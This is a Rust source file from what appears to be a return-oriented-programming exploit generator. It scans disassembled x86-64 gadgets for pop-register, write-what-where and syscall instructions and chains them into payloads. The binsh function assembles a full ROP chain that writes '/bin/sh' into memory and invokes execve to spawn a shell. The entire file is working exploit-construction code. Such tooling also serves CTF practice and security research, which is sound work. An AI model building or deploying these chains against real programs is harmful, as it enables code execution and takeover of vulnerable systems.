use std::vec;

use crate::gadget::Gadget;
use iced_x86::*;

#[derive(PartialEq, Debug)]
pub enum RopElementKind {
    ImmediateValue,
    Gadget,
}

pub struct RopElement {
    value: u64,
    gadget: Gadget,
    element_type: RopElementKind,
}

impl RopElement {
    pub fn new(value: u64, gadget: Gadget, element_type: RopElementKind) -> Self {
        RopElement {
            value: value,
            gadget: gadget,
            element_type: element_type,
        }
    }

    pub fn value(&self) -> u64 {
        self.value
    }

    pub fn kind(&self) -> &RopElementKind {
        &self.element_type
    }

    pub fn gadget(&self) -> &Gadget {
        &self.gadget
    }
}

impl std::fmt::Display for RopElement {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        write!(f, "0x{:x}", self.value)
    }
}

pub fn find_write_what_where(gadgets: &Vec<Gadget>) -> Result<Vec<Gadget>, String> {
    let mut www_gadgets: Vec<Gadget> = Vec::new();

    for gadget in gadgets {
        let instruction = gadget.instructions[1];

        if instruction.mnemonic() == Mnemonic::Mov
            && instruction.op0_kind() == OpKind::Memory
            && instruction.op1_kind() == OpKind::Register
            && instruction.memory_displacement64() == 0
            && instruction.memory_segment() == Register::DS
        {
            www_gadgets.push(gadget.clone());
        }
    }

    if www_gadgets.len() == 0 {
        return Err(String::from("Cannot find write what where gadget"));
    }

    Ok(www_gadgets)
}

pub fn pop(
    gadgets: &Vec<Gadget>,
    register: Register,
    value: u64,
) -> Result<Vec<RopElement>, String> {
    for g in gadgets {
        for i in 1..g.instructions.len() {
            let instruction = g.instructions[i];

            if instruction.mnemonic() != Mnemonic::Pop {
                break;
            }

            if instruction.op0_register() == register {
                let mut v: Vec<RopElement> = Vec::new();

                v.push(RopElement::new(
                    instruction.ip(),
                    g.clone(),
                    RopElementKind::Gadget,
                ));
                v.push(RopElement::new(
                    value,
                    Gadget::default(),
                    RopElementKind::ImmediateValue,
                ));

                for _ in 0..i - 1 {
                    v.push(RopElement::new(
                        0,
                        Gadget::default(),
                        RopElementKind::ImmediateValue,
                    ));
                }

                return Ok(v);
            }
        }
    }

    Err(format!("Cannot find pop {:?}", register))
}

pub fn write_data(
    gadgets: &Vec<Gadget>,
    data: &Vec<u64>,
    address: u64,
) -> Result<Vec<RopElement>, String> {
    let www_gadgets = find_write_what_where(&gadgets);

    let www_gadgets = match www_gadgets {
        Ok(g) => g,
        Err(e) => return Err(e),
    };

    /* try to find a usable one, we need to be able to pop the two registers */
    for g in www_gadgets {
        let reg_src = g.instructions[1].op1_register();
        let reg_dst = g.instructions[1].memory_base();

        let mut rop: Vec<RopElement> = Vec::new();

        for i in 0..data.len() {
            /* Reg src contains the data we want to write */
            let mut pop_reg_src = match pop(gadgets, reg_src, data[i]) {
                Ok(p) => p,
                Err(_) => continue,
            };

            /* reg dst contains the destination address */
            let mut pop_reg_dst = match pop(gadgets, reg_dst, address + i as u64 * 8) {
                Ok(p) => p,
                Err(_) => continue,
            };

            rop.append(&mut pop_reg_src);
            rop.append(&mut pop_reg_dst);
            rop.push(RopElement::new(
                g.instructions[1].ip(),
                g.clone(),
                RopElementKind::Gadget,
            ));
        }

        if rop.len() != 0 {
            return Ok(rop);
        }
    }

    Err(String::from(
        "Impossible to find the gadgets needed to write bytes",
    ))
}

pub fn syscall(
    gadgets: &Vec<Gadget>,
    syscall_nb: u64,
    nbr_args: u64,
    param0: u64,
    param1: u64,
    param2: u64,
    param3: u64,
    param4: u64,
    param5: u64,
) -> Result<Vec<RopElement>, String> {
    let mut rop: Vec<RopElement> = Vec::new();

    let mut pop_rax = match pop(gadgets, Register::RAX, syscall_nb) {
        Ok(e) => e,
        Err(e) => return Err(e),
    };

    rop.append(&mut pop_rax);

    if nbr_args >= 1 {
        let mut pop_rdi = match pop(gadgets, Register::RDI, param0) {
            Ok(e) => e,
            Err(e) => return Err(e),
        };

        rop.append(&mut pop_rdi);
    }

    if nbr_args >= 2 {
        let mut pop_rsi = match pop(gadgets, Register::RSI, param1) {
            Ok(e) => e,
            Err(e) => return Err(e),
        };

        rop.append(&mut pop_rsi);
    }

    if nbr_args >= 3 {
        let mut pop_rdx = match pop(gadgets, Register::RDX, param2) {
            Ok(e) => e,
            Err(e) => return Err(e),
        };

        rop.append(&mut pop_rdx);
    }

    if nbr_args >= 4 {
        let mut pop_rcx = match pop(gadgets, Register::RCX, param3) {
            Ok(e) => e,
            Err(e) => return Err(e),
        };

        rop.append(&mut pop_rcx);
    }

    if nbr_args >= 5 {
        let mut pop_r8 = match pop(gadgets, Register::R8, param4) {
            Ok(e) => e,
            Err(e) => return Err(e),
        };

        rop.append(&mut pop_r8);
    }

    if nbr_args >= 6 {
        let mut pop_r9 = match pop(gadgets, Register::R9, param5) {
            Ok(e) => e,
            Err(e) => return Err(e),
        };

        rop.append(&mut pop_r9);
    }
    let syscall_gadget = match gadgets
        .iter()
        .find(|p| p.instructions[1].mnemonic() == Mnemonic::Syscall)
    {
        Some(e) => e,
        None => return Err(String::from("Cannot find syscall gadget")),
    };

    rop.push(RopElement::new(
        syscall_gadget.instructions[1].ip(),
        syscall_gadget.clone(),
        RopElementKind::Gadget,
    ));

    Ok(rop)
}

/* 2f62696e2f7368 */
const BINSH_STR: u64 = 0x68732F6E69622F;
const EXECVE_SYS: u64 = 59;

pub fn binsh(gadgets: &Vec<Gadget>, writable_address: u64) -> Result<Vec<RopElement>, String> {
    let mut ropchain: Vec<RopElement> = Vec::new();

    let mut w = match write_data(gadgets, &vec![BINSH_STR, 0x0], writable_address) {
        Ok(r) => r,
        Err(e) => return Err(e),
    };

    ropchain.append(&mut w);

    let mut syscall = match syscall(
        gadgets,
        EXECVE_SYS,
        3,
        writable_address,
        writable_address + 8,
        writable_address + 8,
        0,
        0,
        0,
    ) {
        Ok(e) => e,
        Err(e) => return Err(e),
    };

    ropchain.append(&mut syscall);

    Ok(ropchain)
}
